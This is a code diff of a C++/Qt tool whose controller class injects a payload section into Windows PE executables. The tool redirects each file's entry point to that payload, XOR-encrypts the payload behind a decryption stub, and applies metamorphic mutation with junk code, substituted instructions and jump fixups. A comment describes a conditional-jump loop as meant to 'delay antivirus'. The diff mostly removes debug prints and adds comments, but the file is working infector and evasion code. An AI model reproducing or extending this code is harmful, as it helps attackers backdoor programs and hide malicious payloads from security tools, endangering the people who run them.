@@ -50,45 +50,33 @@ Morph_Executable_Controller::Morph_Executable_Controller()
 //destructor
 Morph_Executable_Controller::~Morph_Executable_Controller()
 {
-
-    std::cout << "START OF MORPH DESTRUCTOR" << std::endl;
-
     this->dos_header_ptr = nullptr;
     delete this->dos_header_ptr;
-
-    std::cout << "D 1" << std::endl;
 
     this->image_NT_header_ptr = nullptr;
     delete this->image_NT_header_ptr;
 
-    std::cout << "D 2" << std::endl;
-
     this->text_section_header_ptr = nullptr;
     delete this->text_section_header_ptr;
-    std::cout << "D 3" << std::endl;
+	
     this->payload_section_header_ptr = nullptr;
     delete this->payload_section_header_ptr;
 
-    std::cout << "D 4" << std::endl;
     this->text_section_buffer_ptr = nullptr;
     delete this->text_section_buffer_ptr;
-    std::cout << "D 5" << std::endl;
+
     this->text_section_buffer_original = nullptr;
     delete this->text_section_buffer_original;
-    std::cout << "D 6" << std::endl;
+
     for(int i = 0; i < this->image_section_header_vec.size(); i++)
     {
         delete this->image_section_header_vec[i];
     }
-    std::cout << "D 7" << std::endl;
 
     this->image_section_header_vec.clear();
-    std::cout << "D 8" << std::endl;
+
     this->cur_wind = nullptr;
     delete this->cur_wind;
-
-    std::cout << "END OF MORPH DESTRUCTOR" << std::endl;
-
 }
 
 QString Morph_Executable_Controller::get_disassembly_log()
@@ -104,38 +92,44 @@ QString Morph_Executable_Controller::read_file_into_vector(QString exe_file_path
     return reader.read_file_into_vector(exe_file_path,this->buffer);
 }
 
+//get the image dos header
 PIMAGE_DOS_HEADER Morph_Executable_Controller::get_ptr_image_dos_header(std::vector<char> &buffer, unsigned int image_dos_header_file_cursor)
 {
     char* extracted_dos_header = new char[sizeof(IMAGE_DOS_HEADER)];
 
     for (int i = 0; i < sizeof(IMAGE_DOS_HEADER); i++)
     {
+		//loop will take all the bytes needed specifically for an image dos header
         extracted_dos_header[i] = buffer[image_dos_header_file_cursor + i];
     }
     return (PIMAGE_DOS_HEADER)extracted_dos_header;
 }
 
+//validating the dos header
 QString Morph_Executable_Controller::validate_image_dos_signature(PIMAGE_DOS_HEADER &dos_header_pointer)
 {
     if (dos_header_pointer->e_magic == IMAGE_DOS_SIGNATURE)
     {
-        return SUCCESS_VALID_DOS_SIGNATURE;
+        return SUCCESS_VALID_DOS_SIGNATURE;//validating the dos signature
     }
 
     return ERROR_INVALID_DOS_SIGNATURE;
 }
 
+//get image nt headers32
 PIMAGE_NT_HEADERS32 Morph_Executable_Controller::get_ptr_image_NT_header(std::vector<char>&buffer, unsigned int image_NT_header_file_cursor)
 {
     char *extracted_NT_header = new char[sizeof(IMAGE_NT_HEADERS32)];
 
     for (int i = 0; i < sizeof(IMAGE_NT_HEADERS32); i++)
-    {
+    {	
+		//loop will take all the bytes needed specifically for an image nt headers 32
         extracted_NT_header[i] = buffer[image_NT_header_file_cursor + i];
     }
     return (PIMAGE_NT_HEADERS32)extracted_NT_header;
 }
 
+//validate the PE signature
 QString Morph_Executable_Controller::validate_PE_signature(PIMAGE_NT_HEADERS32 &image_NT_header_ptr)
 {
     if (image_NT_header_ptr->Signature == IMAGE_NT_SIGNATURE)
@@ -146,9 +140,9 @@ QString Morph_Executable_Controller::validate_PE_signature(PIMAGE_NT_HEADERS32 &
     return ERROR_INVALID_PE_SIGNATURE;
 }
 
+//randomize the paylaod section name
 std::string Morph_Executable_Controller::randomize_payload_section_name()
 {
-    //srand(time(NULL));
     std::string alpha_num =  "0123456789"; // numbers
     alpha_num +=             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // uppercase letters
     alpha_num +=             "abcdefghijklmnopqrstuvwxyz"; // lowercase letters
@@ -164,41 +158,45 @@ std::string Morph_Executable_Controller::randomize_payload_section_name()
     return name;
 }
 
-void Morph_Executable_Controller::store_image_section_headers_in_vec(std::vector<char> &buffer, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec,
-                                                                     PIMAGE_NT_HEADERS32& image_NT_header_ptr, unsigned int section_header_cursor)
+//put all image section headers into a vector
+void Morph_Executable_Controller::store_image_section_headers_in_vec(std::vector<char> &buffer, std::vector<PIMAGE_SECTION_HEADER> &																	image_section_header_vec,PIMAGE_NT_HEADERS32& image_NT_header_ptr, 
+																	unsigned int section_header_cursor)
 {
     for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
     {
         image_section_header_vec.push_back(get_ptr_image_section_header(buffer, section_header_cursor + i * sizeof(IMAGE_SECTION_HEADER)));
-        //printf("Name : %s\n", image_section_header_vec[i]->Name);
     }
 }
 
+//get image section header ptr
 PIMAGE_SECTION_HEADER Morph_Executable_Controller::get_ptr_image_section_header(std::vector<char> &buffer, unsigned int section_header_cursor)
 {
     char *extracted_NT_header = new char[sizeof(IMAGE_SECTION_HEADER)];
 
     for (int i = 0; i < sizeof(IMAGE_SECTION_HEADER); i++)
     {
+		//loop will take all the bytes needed specifically for an image section header
         extracted_NT_header[i] = buffer[section_header_cursor + i];
     }
 
     return (PIMAGE_SECTION_HEADER)extracted_NT_header;
 }
 
-QString Morph_Executable_Controller::get_section_header_index_by_name(const std::string section_name, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec, PIMAGE_NT_HEADERS32 &image_NT_header_ptr, int &index_of_text_section)
+//get a section header by the name
+QString Morph_Executable_Controller::get_section_header_index_by_name(const std::string section_name, std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec, PIMAGE_NT_HEADERS32 &image_NT_header_ptr, int &index_of_section)
 {
     for (int i = 0; i < image_NT_header_ptr->FileHeader.NumberOfSections; i++)
     {
-        if (section_name.compare((char*)image_section_header_vec[i]->Name) == 0)
+        if (section_name.compare((char*)image_section_header_vec[i]->Name) == 0)//name must be equal to what was passed in
         {
-            index_of_text_section = i;
-            return SUCCESS_MATCHING_SECTION_HEADER_NAME;
+            index_of_section = i;
+            return SUCCESS_MATCHING_SECTION_HEADER_NAME;//if same return
         }
     }
     return ERROR_NO_MATCHING_SECTION_HEADER_NAME;
 }
 
+//set the new section name
 void Morph_Executable_Controller::set_new_section_name(PIMAGE_SECTION_HEADER &payload_section, const std::string payload_section_name)
 {
     for(int i = 0; i < payload_section_name.length(); i++)
@@ -207,43 +205,47 @@ void Morph_Executable_Controller::set_new_section_name(PIMAGE_SECTION_HEADER &pa
     }
 }
 
+//get the payload radio button
 int Morph_Executable_Controller::get_payload_radio_button()
 {
     QString payload_type = this->cur_wind->get_payload_radio_button();
 
     for(int i = 0; i < LIST_OF_PAYLOADS_VEC.size(); i++)
     {
-        if(payload_type == LIST_OF_PAYLOADS_VEC[i])
+        if(payload_type == LIST_OF_PAYLOADS_VEC[i])//list of the radio button names
         {
             return i;
         }
     }
 
-    return -1;
+    return -1;//error
 }
 
+//calculate the file alignment
 void Morph_Executable_Controller::calculate_file_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                   DWORD &file_alignment,unsigned int &file_alignment_factor)
 {
     file_alignment_factor = payload_num_of_bytes / file_alignment;
-    if(payload_num_of_bytes % file_alignment != 0)
+    if(payload_num_of_bytes % file_alignment != 0) //must be round up by 200
     {
-        file_alignment_factor++;
+        file_alignment_factor++;//simple arithmetic instead of using a loop
     }
 }
 
+//calculate section alignment
 void Morph_Executable_Controller::calculate_section_alignment_factor(unsigned int &payload_num_of_bytes,
                                                                   DWORD &section_aligment,unsigned int &section_alignment_factor,
                                                                      PIMAGE_SECTION_HEADER &previous_section_header_ptr)
 {
     section_alignment_factor = payload_num_of_bytes / section_aligment;
     unsigned int previous_virtual_size = previous_section_header_ptr->Misc.VirtualSize;
-    if(previous_virtual_size % section_aligment != 0)
+    if(previous_virtual_size % section_aligment != 0)//must be round up by 1000
     {
-        section_alignment_factor++;
+        section_alignment_factor++;//simple arithmetic instead of using a loop
     }
 }
 
+//initialize the payload section
 void Morph_Executable_Controller::init_payload_section_header(PIMAGE_SECTION_HEADER &payload_section_header_ptr,
                                                               unsigned int &payload_raw_address,
                                                               unsigned int &payload_raw_data_size,
@@ -258,8 +260,7 @@ void Morph_Executable_Controller::init_payload_section_header(PIMAGE_SECTION_HEA
     payload_section_header_ptr->Characteristics = SECTIONCHARACTERISTICSTOSET;
 }
 
-//this is to print the relevant information of each section header
-//TODO : For e learning, put inside analysis text box or some shit
+//for debuggig purposes
 void Morph_Executable_Controller::print_section_headers(std::vector<PIMAGE_SECTION_HEADER> &image_section_header_vec)
 {
     std::cout << "PRINTING IMAGE SECTION HEADERS" << std::endl;
@@ -280,8 +281,10 @@ void Morph_Executable_Controller::print_section_headers(std::vector<PIMAGE_SECTI
     }
 }
 
+//convert assembly syntax to bytes
 QString Morph_Executable_Controller::asm_to_machine_code(std::string asm_code, std::vector<unsigned char>& machine_code, size_t &machine_code_num_of_bytes)
 {
+	//using keystone API
     ks_engine* ks;
     const char* code = asm_code.c_str();
     ks_err err;
@@ -294,7 +297,7 @@ QString Morph_Executable_Controller::asm_to_machine_code(std::string asm_code, s
         printf("ERROR: failed on ks_open(), quit\n");
         return ERROR_OPENING_KEYSTONE;
     }
-    if (ks_asm(ks, code, 0, &encode, &machine_code_num_of_bytes, &count) != KS_ERR_OK)
+    if (ks_asm(ks, code, 0, &encode, &machine_code_num_of_bytes, &count) != KS_ERR_OK)//if error
     {
         printf("ERROR: ks_asm() failed & count = %lu, error = %u\n",
             count, ks_errno(ks));
@@ -305,7 +308,7 @@ QString Morph_Executable_Controller::asm_to_machine_code(std::string asm_code, s
     for (int i = 0; i < machine_code_num_of_bytes; i++)
     {
         printf("%02x ", encode[i]);
-        machine_code.push_back(encode[i]);
+        machine_code.push_back(encode[i]);//store to the vector
     }
     printf("\n");
     printf("Compiled: %lu bytes, statements: %lu\n", machine_code_num_of_bytes, count);
@@ -316,9 +319,9 @@ QString Morph_Executable_Controller::asm_to_machine_code(std::string asm_code, s
     // close Keystone instance when done
     ks_close(ks);
     return SUCCESS_ASSEMBLY_TO_MACHINE_CODE_KEYSTONE;
-
 }
 
+//get data from a specified section from the buffer which was read in
 char* Morph_Executable_Controller::get_section_data_from_buffer(std::vector <char> &buffer, unsigned int file_offset, unsigned int size_of_section)
 {
     char* section = new char[size_of_section];
@@ -329,6 +332,7 @@ char* Morph_Executable_Controller::get_section_data_from_buffer(std::vector <cha
     return section;
 }
 
+//edit the beginning of text section to jump to payload 
 void Morph_Executable_Controller::editing_text_section_ptr(char *&text_section_buffer_ptr, unsigned int jump_to_payload_byte_length, DWORD text_section_buffer_offset, std::vector<unsigned char> &machine_code_vec)
 {
     //editing the pointer text_section_buffer_ptr to store the jump to payload instruction bytes
@@ -338,9 +342,9 @@ void Morph_Executable_Controller::editing_text_section_ptr(char *&text_section_b
         *(text_section_buffer_ptr + (text_section_buffer_offset)) = machine_code_vec[i];
         text_section_buffer_ptr++;
     }
-
 }
 
+//calculate how many times stosd must be called
 void Morph_Executable_Controller::calculate_num_of_stosd_for_patching(std::string &text_section_memorized_entry_bytes,
                                                                       unsigned int &num_of_stosd,
                                                                       unsigned int jump_to_payload_byte_length,
@@ -362,6 +366,7 @@ void Morph_Executable_Controller::calculate_num_of_stosd_for_patching(std::strin
     }
 }
 
+//create the stosd asm syntax
 void Morph_Executable_Controller::get_stosd_instruction_asm(std::string &patching_entry_bytes_asm,
                                std::string text_section_memorized_entry_bytes,
                                unsigned int num_of_stosd)
@@ -402,9 +407,9 @@ void Morph_Executable_Controller::get_stosd_instruction_asm(std::string &patchin
             patching_entry_bytes_asm += "stosd;";
         }
     }
-
 }
 
+//to populate the pointer which will then be used to reintialize the buffer
 void Morph_Executable_Controller::populate_section_ptr(char *&section_ptr, char *machine_code,
 	unsigned int size_of_machine_code)
 {
@@ -415,6 +420,7 @@ void Morph_Executable_Controller::populate_section_ptr(char *&section_ptr, char 
     }
 }
 
+//put payload bytes into a vector
 void Morph_Executable_Controller::populate_payload_vec(std::vector<unsigned char> &payload_vec, const char *payload_shell_code, unsigned int payload_num_of_bytes)
 {
     for (int i = 0; i < payload_num_of_bytes; i++)
@@ -442,6 +448,7 @@ std::string Morph_Executable_Controller::convert_byte_to_string(char byte)
     return result;
 }
 
+//create jump back to text section asm syntax
 void Morph_Executable_Controller::get_jump_back_to_text_section_instruction_asm(std::string &jump_back_to_text_section_asm, DWORD entry_point_of_text_section)
 {
     jump_back_to_text_section_asm = "mov eax, " +
@@ -450,6 +457,7 @@ void Morph_Executable_Controller::get_jump_back_to_text_section_instruction_asm(
     jump_back_to_text_section_asm += "jmp eax;";
 }
 
+//rewriting the new data into the buffer
 void Morph_Executable_Controller::rewrite_bytes_to_buffer(std::vector<char> &buffer, char *section_buffer_ptr,
                              unsigned int offset, unsigned int byte_size)
 {
@@ -461,9 +469,7 @@ void Morph_Executable_Controller::rewrite_bytes_to_buffer(std::vector<char> &buf
 
 void Morph_Executable_Controller::set_original_exe_name(QString original_exe_name)
 {
-
     this->original_exe_name = original_exe_name;
-
 }
 
 QString Morph_Executable_Controller::get_morphed_exe_name()
@@ -483,15 +489,17 @@ QString Morph_Executable_Controller::get_morphed_exe_file_path()
 
 void Morph_Executable_Controller::set_morphed_exe_file_path(QString exe_file_path)
 {
-
+	//using substring to set the morphed exe file path
     std::string original_exe_file_path = exe_file_path.toStdString().substr(0,exe_file_path.toStdString().find_last_of("/")+1);
-    original_exe_file_path += this->morphed_exe_name.toStdString();
+    
+	original_exe_file_path += this->morphed_exe_name.toStdString();
     std::cout << original_exe_file_path << std::endl;
     this->morphed_exe_file_path = QString(original_exe_file_path.c_str());
 }
 
 void Morph_Executable_Controller::set_morphed_exe_name(QString exe_file_path,std::string modifier)
 {
+	//using substring to get the exe name and set
     std::string original_exe_name = exe_file_path.toStdString().substr(exe_file_path.toStdString().find_last_of("/")+1,exe_file_path.length());
     set_original_exe_name(QString(original_exe_name.c_str()));
 
@@ -502,24 +510,26 @@ void Morph_Executable_Controller::set_morphed_exe_name(QString exe_file_path,std
     this->morphed_exe_name = QString(new_exe_name.c_str());
 }
 
+//write the new exe 
 void Morph_Executable_Controller::write_exe_file(QString morphed_exe_file_path, std::vector<char> &buffer)
 {
     File_Saver saver;
     saver.write_exe_file(morphed_exe_file_path,buffer);
 }
 
+//create store edi asm syntax
 void Morph_Executable_Controller::store_edi(std::string &store_payload_entry_point_in_edi_asm, DWORD entry_point_of_text_section)
 {
-    store_payload_entry_point_in_edi_asm = "mov edi, " + convert_num_to_hex<DWORD>(entry_point_of_text_section) + ";";
+    store_payload_entry_point_in_edi_asm = "mov edi, " + convert_num_to_hex<DWORD>(entry_point_of_text_section) + ";"; //must store in destination index (EDI)
 }
 
 char Morph_Executable_Controller::generate_random_key()
 {
-    //srand(time(NULL));
     //key must be 0 to 255, max range is FF in hexadecimal
     return rand() % 256;
 }
 
+//add bytes into a vector
 void Morph_Executable_Controller::add_bytes_into_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
                                                      std::vector<unsigned char> machine_code_vec)
 {
@@ -529,6 +539,7 @@ void Morph_Executable_Controller::add_bytes_into_vec(std::vector<unsigned char> 
     }
 }
 
+//XOR encryption
 void Morph_Executable_Controller::encrypt_bytes_after_decryption_instruction_vec(std::vector<unsigned char> &bytes_after_decryption_instructions_vec,
                                                                                  char random_key)
 {
@@ -538,6 +549,7 @@ void Morph_Executable_Controller::encrypt_bytes_after_decryption_instruction_vec
     }
 }
 
+//get decryption asm syntax
 void Morph_Executable_Controller::get_decryption_asm(std::string &decrypt_asm,
                                                      DWORD start_of_payload_section_offset,
                                                      unsigned int length_of_random_key,
@@ -560,10 +572,6 @@ void Morph_Executable_Controller::get_decryption_asm(std::string &decrypt_asm,
 
     unsigned int length_of_first_half = machine_code_num_of_bytes;
 
-    //TESTING
-    std::cout << "CMP EAX, Size of bytes after decryption: " << size_of_bytes_after_decryption_instructions_vec
-              << " : " << convert_byte_to_string(size_of_bytes_after_decryption_instructions_vec) << std::endl;
-
     std::string decrypt_second_half = "xor byte ptr [eax], cl;" ; // start decrypting from address of encrypted bytes, stored in eax
     decrypt_second_half += "inc ebx;"; // increase ebx, this acts as a counter
     decrypt_second_half += "inc eax;"; // increase eax, this adds the address + 1, this is to traverse the encrypted bytes
@@ -581,16 +589,9 @@ void Morph_Executable_Controller::get_decryption_asm(std::string &decrypt_asm,
                 + num_of_bytes
                 +";";
     }
-
-    //testing
-    std::cout << "testing convert: " << convert_decimal_to_hexa(155) << std::endl;
-
-
-
-
-
+	
+	//transform to machine code
     machine_code_vec.clear();
-
     asm_to_machine_code(decrypt_second_half,machine_code_vec,machine_code_num_of_bytes);
 
     //getting the length of the second half, this does not include the jne instruction yet
@@ -598,9 +599,6 @@ void Morph_Executable_Controller::get_decryption_asm(std::string &decrypt_asm,
 
     //this is the total length of the decryption function
     unsigned int length_of_decryption_function = length_of_first_half + length_of_second_half;
-
-    //TODO, the JNE, for now the jne length is hard coded
-
 
     decrypt_asm = "mov ecx, dword ptr[" +
             convert_num_to_hex<DWORD>(start_of_payload_section_offset) +"];";//this is to obtain the random key, which is at the first offset
@@ -640,14 +638,17 @@ void Morph_Executable_Controller::calculate_jne_short_backwards(std::vector<unsi
     }
 }
 
+//place random key at the beginning of payload section
 void Morph_Executable_Controller::add_random_key_to_payload_section_buffer_ptr(char *&payload_section_buffer_ptr, char random_key)
 {
     *payload_section_buffer_ptr = random_key;
     payload_section_buffer_ptr++;
 }
 
+//transform bytes into assembly syntax
 QString Morph_Executable_Controller::machine_code_to_asm(std::vector<unsigned char> payload_vec, std::vector<Disassembly> &dis_asm_vec)
 {
+	//using capstone API
     QString morph_status = SUCCESS_MACHINE_CODE_TO_ASSEMBLY_CAPSTONE;
     csh handle;
     cs_insn *insn;
@@ -675,10 +676,7 @@ QString Morph_Executable_Controller::machine_code_to_asm(std::vector<unsigned ch
 
             //ss << insn[j].mnemonic << " " << insn[j].op_str << ";";
             dis_asm_vec.emplace_back(Disassembly(id, address, mnemonic, ops, size, insn[j].bytes));
-
         }
-
-
     }
     else
     {
@@ -690,7 +688,6 @@ QString Morph_Executable_Controller::machine_code_to_asm(std::vector<unsigned ch
 
     return morph_status;
 }
-
 
 std::string Morph_Executable_Controller::convert_decimal_to_hexa(int num)
 {
@@ -734,7 +731,8 @@ std::string Morph_Executable_Controller::convert_decimal_to_hexa(int num)
 
     return hexaString;
 }
-//========================================== Junk Instructions ===================================
+
+//========================================== Junk Instructions & Conditional Jump ===================================
 
 //check if you wanna insert based on probability
 bool Morph_Executable_Controller::to_insert_or_not(int chance)
@@ -760,6 +758,7 @@ bool Morph_Executable_Controller::check_is_jump_instruction(int id)
     return false;
 }
 
+//conditional jump instruction to delay antivirus
 std::string Morph_Executable_Controller::generate_conditional_jumps_instructions()
 {
     std::string conditional_jump_instruction = "push ecx; mov ecx, 0x0; inc ecx; cmp ecx, 0xffffff; jne 0x6; pop ecx;";
@@ -767,18 +766,18 @@ std::string Morph_Executable_Controller::generate_conditional_jumps_instructions
     return conditional_jump_instruction;
 }
 
+//generate junk instructions
 QString Morph_Executable_Controller::junk_code_generator(std::vector<unsigned char>& machine_code_vec, size_t &machine_code_num_of_bytes)
 {
     QString morph_status = QString("");
-
-    //need array of junk instructions
-    //currently just one
-    std::string junk_instructions = "push eax;nop;pop eax;";
+	
+    std::string junk_instructions = "push eax;nop;pop eax;";//for Proof of concept
     machine_code_vec.clear();
     morph_status = asm_to_machine_code(junk_instructions, machine_code_vec, machine_code_num_of_bytes);
     return morph_status;
 }
 
+//for debuggin purposes
 void Morph_Executable_Controller::print_dis_asm_vec(std::vector<Disassembly> &dis_asm_vec)
 {
     std::cout << "PRINTING DISASSEMBLY" << std::endl;
@@ -792,19 +791,17 @@ void Morph_Executable_Controller::print_dis_asm_vec(std::vector<Disassembly> &di
     std::cout << std::endl;
 }
 
+//store which addresses to add in the new junk instructions
 void Morph_Executable_Controller::randomize_and_store_insertions(std::vector<uint64_t> &address_of_insertions_vec,
                                                                  std::vector<Disassembly> &jump_instructions_vec,
                                                                  std::vector<Disassembly> dis_asm_vec)
 {
-    //srand(time(NULL)); //produce a randome number
-
     std::string  register_array[] = { "eax", "ebx", "ecx", "edx", "ebp", "esp", "esi", "edi" };
 
     for (int i = 0; i < dis_asm_vec.size(); i++)
     {
         if (to_insert_or_not(rand() % 100) == true) //if wanna insert
         {
-
             std::string mnemonic = dis_asm_vec[i].get_mnemonic(); //get the mnemonic
 
             if (mnemonic.compare("call") == 0) //if mnemonic is "call"
@@ -824,6 +821,7 @@ void Morph_Executable_Controller::randomize_and_store_insertions(std::vector<uin
                 address_of_insertions_vec.emplace_back(dis_asm_vec[i].get_address());
             }
         }
+		
         if (check_is_jump_instruction(dis_asm_vec[i].get_id()) == true) //checking if the it is a jmp instruction
         {
             jump_instructions_vec.emplace_back(dis_asm_vec[i]);
@@ -831,6 +829,7 @@ void Morph_Executable_Controller::randomize_and_store_insertions(std::vector<uin
     }
 }
 
+//initialize a tracker, need the original offsets for comparisons
 void Morph_Executable_Controller::init_tracker_vec(std::vector<Disassembly> &tracker_vec,
                                                    std::vector<Disassembly> jump_instructions_vec)
 {
@@ -840,6 +839,7 @@ void Morph_Executable_Controller::init_tracker_vec(std::vector<Disassembly> &tra
     }
 }
 
+//to adjust all offsets which are within a jump
 void Morph_Executable_Controller::calculate_and_adjust_offsets_within_jump_range(std::vector<uint64_t> &address_of_insertions_vec,
                                                                                  std::vector<Disassembly> &jump_instructions_vec,
                                                                                  std::vector<Disassembly> tracker_vec,
@@ -857,7 +857,7 @@ void Morph_Executable_Controller::calculate_and_adjust_offsets_within_jump_range
     }
 }
 
-
+//method for adjusting the offsets within jumping
 void Morph_Executable_Controller::adjust_offsets_within_jump_range(uint64_t &address_of_insertion,
                                                                    Disassembly &jump_instruction,
                                                                    Disassembly &tracker_instruction,
@@ -927,9 +927,6 @@ void Morph_Executable_Controller::adjust_offsets_within_jump_range(uint64_t &add
             temp = jump_instruction.get_twos_complement_offset() * -1;
             temp += machine_code_num_of_bytes;
 
-            //not known if needed
-            //trackerVec.at(jmpIndex).twos_compliment_offset += 1;
-
             std::cout << "Before : Jump instruction bytes : ";
             for (int i = 0; i < bytes_vec.size(); i++)
             {
@@ -962,15 +959,18 @@ void Morph_Executable_Controller::adjust_offsets_within_jump_range(uint64_t &add
         std::cout << "Jump instruction bytes : ";
         std::vector<unsigned char> bytes_vec = jump_instruction.get_bytes_vec();
 
-        for (int i = 0; i < bytes_vec.size(); i++) {
+        for (int i = 0; i < bytes_vec.size(); i++) 
+		{
             std::cout << convert_byte_to_string(bytes_vec[i]) << " ";
         }
+		
         std::cout << "\nJumping from 0x" << std::hex << jump_instruction.get_address() << " to 0x" << std::hex <<
             (jump_instruction.get_address() + jump_instruction.get_twos_complement_offset()) << std::endl;
         std::cout << std::endl;
     }
 }
 
+//check if its a signed bit
 unsigned char Morph_Executable_Controller::calculate_signed_bit(char original_relative_offset)
 {
     unsigned char signed_bit = 0;
@@ -988,6 +988,7 @@ unsigned char Morph_Executable_Controller::calculate_signed_bit(char original_re
     return signed_bit;
 }
 
+//modifying the new jump instructions
 void Morph_Executable_Controller::modify_jumps_in_dis_asm_vec(std::vector<Disassembly> &dis_asm_vec,
                                                               std::vector<Disassembly> &jump_instructions_vec)
 {
@@ -1004,16 +1005,16 @@ void Morph_Executable_Controller::modify_jumps_in_dis_asm_vec(std::vector<Disass
     }
 }
 
+//adding condictional jumps
 void Morph_Executable_Controller::add_conditional_jumps_instructions(std::vector<Disassembly> &dis_asm_vec,
                                                                      std::vector<unsigned char> &machine_code_vec,
                                                                      size_t &machine_code_num_of_bytes)
 
 {
-
     for(int i = 0; i < dis_asm_vec.size(); i++)
     {
         if( dis_asm_vec[i].get_not_in_jump() == true &&
-                dis_asm_vec[i].get_modified_status() == false)
+                dis_asm_vec[i].get_modified_status() == false)//if it is not within jump and not yet modified
         {
             int chance = rand() % 100;//used for variance
             if(to_insert_or_not(chance) == true)
@@ -1028,6 +1029,7 @@ void Morph_Executable_Controller::add_conditional_jumps_instructions(std::vector
     }
 }
 
+//adding junk instructions
 void Morph_Executable_Controller::add_junk_instructions(std::vector<unsigned char> &payload_vec,
                                                                 std::vector<Disassembly> &dis_asm_vec,
                                                                 std::vector<unsigned char> &machine_code_vec,
@@ -1047,8 +1049,6 @@ void Morph_Executable_Controller::add_junk_instructions(std::vector<unsigned cha
     //get the junk code stored inside machine code vec
     morph_status = junk_code_generator(machine_code_vec, machine_code_num_of_bytes);
     error_warning_message_box(morph_status);
-
-
 
     //randomize chances of adding junk code
     //need to store which address it is being inserted at
@@ -1081,16 +1081,15 @@ void Morph_Executable_Controller::add_junk_instructions(std::vector<unsigned cha
     //print_dis_asm_vec(dis_asm_vec);
     std::cout << std::endl << std::endl;
 
-
     for (int i = 0; i < payload_vec.size(); i++)
     {
         std::cout  << convert_byte_to_string(payload_vec[i]);
     }
 
     std::cout << std::endl;
-
 }
 
+//add into the payload vector the junk instructions
 void Morph_Executable_Controller::modify_payload_vec_with_junk_instructions(std::vector<uint64_t> &address_of_insertions_vec,
                                                                             std::vector<Disassembly> &dis_asm_vec,
                                                                             std::vector<unsigned char> &machine_code_vec,
@@ -1108,7 +1107,7 @@ void Morph_Executable_Controller::modify_payload_vec_with_junk_instructions(std:
         {
             if (dis_asm_vec[i].get_address() == address_of_insertions_vec[j])
             {
-                toInsert = true;
+                toInsert = true;//if it is to be inserted
                 address_of_insertions_vec.erase(address_of_insertions_vec.begin() + j);
             }
         }
@@ -1120,7 +1119,7 @@ void Morph_Executable_Controller::modify_payload_vec_with_junk_instructions(std:
             {
                 payload_vec.emplace_back(machine_code_vec[k]);
             }
-            i--;
+            i--;//so can get back the original instructions
         }
         else
         {
@@ -1133,10 +1132,11 @@ void Morph_Executable_Controller::modify_payload_vec_with_junk_instructions(std:
     }
 }
 
-// ======================================== END OF JUNK INSTRUCTIONS ===============================
+// ======================================== END OF JUNK INSTRUCTIONS & Conditional Jump ===============================
 
 // ======================================== ALT INSTRUCTIONS ======================================
 
+//add the alternative instructions to the payload
 void Morph_Executable_Controller::modify_payload_vec_with_alternative_instructions(std::vector<unsigned char> &payload_vec,
                                                                                    std::vector<Disassembly> &dis_asm_vec)
 {
@@ -1152,6 +1152,7 @@ void Morph_Executable_Controller::modify_payload_vec_with_alternative_instructio
     }
 }
 
+//checking if it is a jump instruction
 void Morph_Executable_Controller::check_for_relative_jumps(std::vector<Disassembly> &dis_asm_vec)
 {
     //i'll search for any relative jump instructions
@@ -1167,10 +1168,8 @@ void Morph_Executable_Controller::check_for_relative_jumps(std::vector<Disassemb
         // this is checking for all the jump statements (not including call)
         if(dis_asm_vec[i].get_id() >= 253 && dis_asm_vec[i].get_id() <= 270)
         {
-
             has_relative_jmp = true;
             std::cout << "FOUND 1: " <<  mnemonic << std::endl;
-
         }
         else if(mnemonic.compare("call") == 0)//if the mnemonic is "call" instruction
         {
@@ -1192,6 +1191,7 @@ void Morph_Executable_Controller::check_for_relative_jumps(std::vector<Disassemb
                 }
             }
         }
+		
         if(has_relative_jmp == true)
         {
             std::cout << "HAS RELATIVE JUMP: " << dis_asm_vec[i].get_full_instruction() << std::endl;
@@ -1202,6 +1202,7 @@ void Morph_Executable_Controller::check_for_relative_jumps(std::vector<Disassemb
     }
 }
 
+//check if instructions is within a jump
 void Morph_Executable_Controller::check_not_in_jump(std::vector<Disassembly> &dis_asm_vec, int index)
 {
 
@@ -1248,6 +1249,7 @@ void Morph_Executable_Controller::check_not_in_jump(std::vector<Disassembly> &di
     }
 }
 
+//generating the new instructions to machine code
 void Morph_Executable_Controller::gen_new_machine_code(Disassembly &instruction,
                                                        std::string new_instruction,
                                                        std::vector<unsigned char> &machine_code_vec,
@@ -1277,6 +1279,7 @@ void Morph_Executable_Controller::gen_new_machine_code(Disassembly &instruction,
         std::cout << std::endl;
 }
 
+//alt inc or dec asm
 void Morph_Executable_Controller::alternative_inc_or_dec_instruction(std::vector<Disassembly> &dis_asm_vec,
                                                          std::vector<unsigned char> &machine_code_vec,
                                                          size_t &machine_code_num_of_bytes)
@@ -1286,9 +1289,8 @@ void Morph_Executable_Controller::alternative_inc_or_dec_instruction(std::vector
 
     for(int i = 0; i < dis_asm_vec.size() ; i++)
     {
-
         if(dis_asm_vec[i].get_not_in_jump() == true &&
-                dis_asm_vec[i].get_modified_status() == false)
+                dis_asm_vec[i].get_modified_status() == false)//if its not within jump and not yet modified
         {
             std::string reg = dis_asm_vec[i].get_ops();
             std::string new_instruction = "";
@@ -1316,6 +1318,7 @@ void Morph_Executable_Controller::alternative_inc_or_dec_instruction(std::vector
     }
 }
 
+//check if the asm syntax contains a pointer liek mov eax, dword ptr [0x234]
 bool Morph_Executable_Controller::check_instruction_is_ptr(std::string ops)
 {
     if(ops.find("]") != std::string::npos)//found a [ ], means its a pointer
@@ -1326,7 +1329,7 @@ bool Morph_Executable_Controller::check_instruction_is_ptr(std::string ops)
     return false;
 }
 
-
+//alt sub instruction 
 std::string Morph_Executable_Controller::generate_alternative_sub_instructions(std::string original_instruction,
                                                                                std::string right_op,
                                                                                std::string left_op,
@@ -1382,8 +1385,6 @@ std::string Morph_Executable_Controller::generate_alternative_sub_instructions(s
             }
             new_instruction = new_instruction + dec_instruction;
         }
-
-
     }
     return new_instruction;
 }
@@ -1429,17 +1430,15 @@ void Morph_Executable_Controller::alternative_sub_instruction(std::vector<Disass
                                                                                         right_op_is_reg,
                                                                                         right_op_hex);
 
-
                     //now reassigning back the new instruction
                     gen_new_machine_code(dis_asm_vec[i],new_instruction,machine_code_vec,machine_code_num_of_bytes);
-
                 }
             }
         }
     }
 }
 
-
+//alt add instructions
 std::string Morph_Executable_Controller::generate_alternative_add_instructions(std::string original_instruction,
                                                                                std::string right_op,
                                                                                std::string left_op,
